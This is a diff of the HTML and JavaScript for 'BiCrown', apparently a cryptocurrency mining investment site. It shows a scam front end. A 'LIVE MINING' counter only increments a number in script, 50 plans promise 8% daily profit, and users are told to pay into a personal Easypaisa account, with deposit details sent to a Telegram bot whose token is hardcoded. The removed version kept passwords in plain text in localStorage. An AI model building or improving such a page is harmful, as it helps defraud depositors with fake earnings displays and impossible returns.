@@ -3,164 +3,155 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>BiCrown | Mining Network</title>
+    <title>BiCrown | Elite Mining</title>
     <style>
-        :root { --neon-purple: #bc13fe; --dark-bg: #050505; --card-bg: #121212; --text-gray: #aaa; --success: #00ff88; }
-        body { font-family: 'Segoe UI', sans-serif; background: var(--dark-bg); color: white; margin: 0; display: flex; flex-direction: column; height: 100vh; overflow: hidden; }
+        :root { --neon: #bc13fe; --dark: #080808; --card: #151515; --success: #00ff88; --gold: #ffcc00; }
+        body { font-family: 'Inter', sans-serif; background: var(--dark); color: white; margin: 0; display: flex; }
         
-        /* Auth Screens */
-        #auth-container { position: fixed; width: 100%; height: 100%; background: #000; z-index: 2000; display: flex; justify-content: center; align-items: center; }
-        .auth-card { background: var(--card-bg); padding: 40px; border-radius: 25px; width: 90%; max-width: 400px; border: 1px solid #222; text-align: center; }
-        .auth-card h2 { color: var(--neon-purple); margin-bottom: 20px; }
+        /* Sidebar */
+        .sidebar { width: 260px; background: #000; height: 100vh; border-right: 1px solid #222; position: fixed; padding: 25px; }
+        .sidebar h1 { font-size: 28px; color: var(--neon); text-shadow: 0 0 15px var(--neon); margin-bottom: 40px; }
+        .nav-item { padding: 15px; color: #888; cursor: pointer; border-radius: 12px; margin-bottom: 10px; transition: 0.3s; display: flex; align-items: center; gap: 10px; }
+        .nav-item:hover, .nav-item.active { background: #1a1a1a; color: white; border-left: 4px solid var(--neon); }
+
+        /* Main Content */
+        .main { margin-left: 290px; padding: 30px; width: 100%; }
         
-        /* Sidebar & Main (Hidden initially) */
-        #app-content { display: none; width: 100%; height: 100%; }
-        .sidebar { width: 250px; background: #000; height: 100vh; border-right: 1px solid #222; position: fixed; padding: 20px; }
-        .main { margin-left: 280px; padding: 30px; width: calc(100% - 280px); overflow-y: auto; height: 100vh; }
-
-        /* Shared UI */
-        input, select { width: 100%; padding: 14px; margin: 10px 0; border-radius: 12px; border: 1px solid #333; background: #000; color: white; box-sizing: border-box; }
-        .btn { background: linear-gradient(45deg, var(--neon-purple), #6a11cb); color: white; border: none; padding: 14px; width: 100%; border-radius: 12px; cursor: pointer; font-weight: bold; margin-top: 10px; }
-        .card { background: var(--card-bg); padding: 25px; border-radius: 20px; border: 1px solid #222; margin-bottom: 20px; }
+        /* Dashboard VIP Cards */
+        .hero-card { background: linear-gradient(135deg, #1a1a1a 0%, #000 100%); padding: 40px; border-radius: 30px; border: 1px solid #333; position: relative; overflow: hidden; margin-bottom: 30px; }
+        .hero-card::before { content: ''; position: absolute; top: -50%; right: -20%; width: 300px; height: 300px; background: var(--neon); filter: blur(120px); opacity: 0.2; }
         
-        .nav-item { padding: 15px; color: var(--text-gray); cursor: pointer; border-radius: 12px; margin-bottom: 5px; }
-        .nav-item.active { background: #1a1a1a; color: white; border-left: 4px solid var(--neon-purple); }
+        .stat-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 20px; }
+        .stat-box { background: var(--card); padding: 25px; border-radius: 20px; border: 1px solid #222; transition: 0.3s; }
+        .stat-box:hover { border-color: var(--neon); transform: translateY(-5px); }
+        .stat-box h4 { color: #888; margin: 0; font-size: 14px; text-transform: uppercase; }
+        .stat-box h2 { margin: 10px 0 0; font-size: 24px; }
 
-        .plan-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(250px, 1fr)); gap: 20px; }
-        .plan-card { background: #181818; padding: 20px; border-radius: 20px; border: 1px solid #333; text-align: center; }
+        /* Buttons */
+        .btn-group { display: flex; gap: 15px; margin-top: 25px; }
+        .btn { padding: 12px 25px; border-radius: 12px; border: none; font-weight: bold; cursor: pointer; transition: 0.3s; }
+        .btn-main { background: var(--neon); color: white; box-shadow: 0 0 20px rgba(188, 19, 254, 0.4); }
+        .btn-sec { background: transparent; border: 1px solid #444; color: white; }
 
-        @media (max-width: 768px) {
-            .sidebar { width: 100%; height: auto; position: relative; border-right: none; border-bottom: 1px solid #222; }
-            .main { margin-left: 0; width: 100%; }
-            body { overflow-y: auto; }
-        }
+        /* Mining Animation */
+        .mining-bar { height: 4px; background: #222; width: 100%; border-radius: 10px; margin-top: 15px; overflow: hidden; }
+        .mining-progress { height: 100%; background: var(--success); width: 45%; box-shadow: 0 0 10px var(--success); animation: pulse 2s infinite; }
+        
+        @keyframes pulse { 0% { opacity: 0.5; } 50% { opacity: 1; } 100% { opacity: 0.5; } }
+        
+        input { width: 100%; padding: 15px; background: #000; border: 1px solid #333; border-radius: 10px; color: white; margin-bottom: 15px; }
+        
+        @media (max-width: 768px) { .sidebar { display: none; } .main { margin-left: 0; padding: 15px; } }
     </style>
 </head>
 <body>
 
-    <div id="auth-container">
-        <div class="auth-card" id="signup-form">
-            <h2>Create Account</h2>
-            <p style="color:var(--text-gray)">Start your mining journey</p>
-            <input type="text" id="reg-phone" placeholder="Phone Number">
-            <input type="email" id="reg-email" placeholder="Gmail Address">
-            <input type="password" id="reg-pass" placeholder="Password">
-            <button class="btn" onclick="handleSignup()">Register Now</button>
-            <p style="margin-top:15px; font-size:14px;">Already have an account? <a href="#" onclick="toggleAuth()" style="color:var(--neon-purple)">Login</a></p>
-        </div>
-
-        <div class="auth-card" id="login-form" style="display:none;">
-            <h2>Welcome Back</h2>
-            <input type="email" id="login-email" placeholder="Gmail Address">
-            <input type="password" id="login-pass" placeholder="Password">
-            <button class="btn" onclick="handleLogin()">Login</button>
-            <p style="margin-top:15px; font-size:14px;">New user? <a href="#" onclick="toggleAuth()" style="color:var(--neon-purple)">Signup</a></p>
-        </div>
+    <div class="sidebar">
+        <h1>BiCrown</h1>
+        <div class="nav-item active" onclick="showPage('dash')">📊 Dashboard</div>
+        <div class="nav-item" onclick="showPage('plans')">⛏️ Mining Plans</div>
+        <div class="nav-item" onclick="showPage('wallet')">💳 My Wallet</div>
+        <div class="nav-item" onclick="location.reload()" style="color: #ff4444; margin-top: 100px;">🔓 Logout</div>
     </div>
 
-    <div id="app-content">
-        <div class="sidebar">
-            <h1 style="color:var(--neon-purple)">BiCrown</h1>
-            <div class="nav-item active" onclick="showPage('dash')">🏠 Dashboard</div>
-            <div class="nav-item" onclick="showPage('plans')">💎 Mining Plans</div>
-            <div class="nav-item" onclick="showPage('wallet')">💰 Wallet</div>
-            <div class="nav-item" onclick="handleLogout()" style="margin-top:50px; color:red">🚪 Logout</div>
+    <div class="main">
+        <div id="dash-page">
+            <div class="hero-card">
+                <div style="display: flex; justify-content: space-between; align-items: flex-start;">
+                    <div>
+                        <p style="color: #888; margin: 0;">Total Balance</p>
+                        <h1 style="font-size: 55px; margin: 10px 0;">Rs <span id="main-bal">0.00</span></h1>
+                    </div>
+                    <div style="text-align: right;">
+                        <span style="background: rgba(0,255,136,0.1); color: var(--success); padding: 5px 15px; border-radius: 20px; font-size: 12px;">● LIVE MINING</span>
+                        <h3 id="live-coins" style="margin: 10px 0; color: var(--success); font-family: monospace;">$0.000000</h3>
+                    </div>
+                </div>
+                <div class="mining-bar"><div class="mining-progress"></div></div>
+                <div class="btn-group">
+                    <button class="btn btn-main" onclick="showPage('wallet')">Deposit</button>
+                    <button class="btn btn-sec" onclick="showPage('wallet')">Withdraw</button>
+                </div>
+            </div>
+
+            <div class="stat-grid">
+                <div class="stat-box">
+                    <h4>Today's Earnings</h4>
+                    <h2 style="color: var(--success);">+ Rs 0.00</h2>
+                </div>
+                <div class="stat-box">
+                    <h4>Active Miners</h4>
+                    <h2 id="active-miners">0</h2>
+                </div>
+                <div class="stat-box">
+                    <h4>Team Members</h4>
+                    <h2 id="team-count">0</h2>
+                </div>
+            </div>
         </div>
 
-        <div class="main">
-            <div id="dash-page">
-                <div class="card">
-                    <p style="color:var(--text-gray)">User: <span id="display-email"></span></p>
-                    <h1 style="font-size: 40px;">Rs <span id="balance">0.00</span></h1>
-                    <p style="color:var(--success)">● Mining Engine Online</p>
+        <div id="wallet-page" style="display:none;">
+            <div class="hero-card">
+                <h2>Add Funds (Deposit)</h2>
+                <p>Send payment to Easypaisa Account:</p>
+                <div style="background: #000; padding: 20px; border-radius: 15px; border: 1px dashed var(--neon); margin: 20px 0;">
+                    <p style="margin: 5px 0;"><strong>Number:</strong> 0312-3456789</p>
+                    <p style="margin: 5px 0;"><strong>Name:</strong> Romi Shah</p>
                 </div>
-                <div class="plan-grid">
-                    <div class="card"><h4>Team</h4><h2>12</h2></div>
-                    <div class="card"><h4>Daily Profit</h4><h2>Rs 250</h2></div>
-                </div>
+                <input type="number" id="d-amt" placeholder="Amount (Rs)">
+                <input type="text" id="d-trx" placeholder="TRX ID (Transaction ID)">
+                <button class="btn btn-main" style="width: 100%;" onclick="notify('Deposit')">Submit Payment</button>
             </div>
+        </div>
 
-            <div id="plans-page" style="display:none;">
-                <h2>Mining Plans</h2>
-                <div class="plan-grid" id="plan-list"></div>
-            </div>
-
-            <div id="wallet-page" style="display:none;">
-                <div class="card">
-                    <h2>Deposit</h2>
-                    <p>Easypaisa: 03431793371 ( BiCrown)</p>
-                    <input type="number" id="dep-amt" placeholder="Amount">
-                    <input type="text" id="dep-trx" placeholder="TRX ID">
-                    <button class="btn" onclick="sendAdmin('Deposit')">Submit</button>
-                </div>
-                <div class="card">
-                    <h2>Withdraw</h2>
-                    <input type="number" id="wit-amt" placeholder="Amount">
-                    <input type="text" id="wit-num" placeholder="Account Number">
-                    <button class="btn" style="background:#222; border:1px solid var(--success)" onclick="sendAdmin('Withdraw')">Withdraw</button>
-                </div>
-            </div>
+        <div id="plans-page" style="display:none;">
+            <h2 style="margin-bottom: 30px;">Premium Mining Tiers</h2>
+            <div class="stat-grid" id="plan-container"></div>
         </div>
     </div>
 
     <script>
-        const botToken = "8494802061:AAHOhQJElPVkOqCuyZ0cP5PKL3k0_P50dDE";
-        const chatId = "7005219148";
-
-        // Auth Logic
-        function toggleAuth() {
-            const signup = document.getElementById('signup-form');
-            const login = document.getElementById('login-form');
-            signup.style.display = signup.style.display === 'none' ? 'block' : 'none';
-            login.style.display = login.style.display === 'none' ? 'block' : 'none';
-        }
-
-        function handleSignup() {
-            const email = document.getElementById('reg-email').value;
-            const pass = document.getElementById('reg-pass').value;
-            const phone = document.getElementById('reg-phone').value;
-
-            if(email && pass && phone) {
-                localStorage.setItem('userEmail', email);
-                localStorage.setItem('userPass', pass);
-                alert("Account Created! Please Login.");
-                toggleAuth();
-            } else { alert("Please fill all fields!"); }
-        }
-
-        function handleLogin() {
-            const email = document.getElementById('login-email').value;
-            const pass = document.getElementById('login-pass').value;
-
-            if(email === localStorage.getItem('userEmail') && pass === localStorage.getItem('userPass')) {
-                document.getElementById('auth-container').style.display = 'none';
-                document.getElementById('app-content').style.display = 'flex';
-                document.getElementById('display-email').innerText = email;
-            } else { alert("Wrong Email or Password!"); }
-        }
-
-        function handleLogout() {
-            location.reload(); // Simple logout for now
-        }
-
+        // Tab System
         function showPage(p) {
-            ['dash-page', 'plans-page', 'wallet-page'].forEach(id => document.getElementById(id).style.display = 'none');
+            ['dash-page', 'wallet-page', 'plans-page'].forEach(id => document.getElementById(id).style.display = 'none');
             document.getElementById(p + '-page').style.display = 'block';
         }
 
-        // Plans Generator
-        const planList = document.getElementById('plan-list');
-        for(let i=1; i<=20; i++) {
-            let p = 350 + (i*500);
-            planList.innerHTML += `<div class="plan-card"><h3>Level ${i}</h3><h2>Rs ${p}</h2><button class="btn" onclick="showPage('wallet')">Buy Now</button></div>`;
+        // Live Mining Animation
+        let coin = 0;
+        setInterval(() => {
+            coin += 0.000012;
+            document.getElementById('live-coins').innerText = "$" + coin.toFixed(6);
+        }, 1000);
+
+        // Generate 50+ Real Plans
+        const pContainer = document.getElementById('plan-container');
+        for (let i = 1; i <= 50; i++) {
+            let price = 350 + (i * 500);
+            let daily = Math.floor(price * 0.08);
+            pContainer.innerHTML += `
+                <div class="stat-box" style="text-align: center;">
+                    <p style="color: var(--neon); font-weight: bold;">MINER v${i}</p>
+                    <h2>Rs ${price.toLocaleString()}</h2>
+                    <p style="color: var(--success); font-size: 14px; margin: 15px 0;">Daily Profit: Rs ${daily}</p>
+                    <button class="btn btn-sec" style="width: 100%; font-size: 12px;" onclick="showPage('wallet')">Activate</button>
+                </div>
+            `;
         }
 
-        function sendAdmin(type) {
-            let msg = `📢 *BiCrown Alert*%0AUser: ${localStorage.getItem('userEmail')}%0AType: ${type}`;
+        // Telegram Notification
+        function notify(type) {
+            const botToken = "8494802061:AAHOhQJElPVkOqCuyZ0cP5PKL3k0_P50dDE";
+            const chatId = "7005219148";
+            const amt = document.getElementById('d-amt').value;
+            const trx = document.getElementById('d-trx').value;
+
+            if(!amt || !trx) { alert("Please fill all details!"); return; }
+
+            const msg = `🚀 *NEW DEPOSIT REQUEST*%0A💰 Amount: Rs ${amt}%0A🆔 TRX: ${trx}`;
             fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${msg}&parse_mode=Markdown`)
-            .then(() => alert("Request sent to Romi Shah (Admin)"));
+            .then(() => alert("Request sent! Admin will approve in 30 mins."));
         }
     </script>
 </body>
 </html>
-
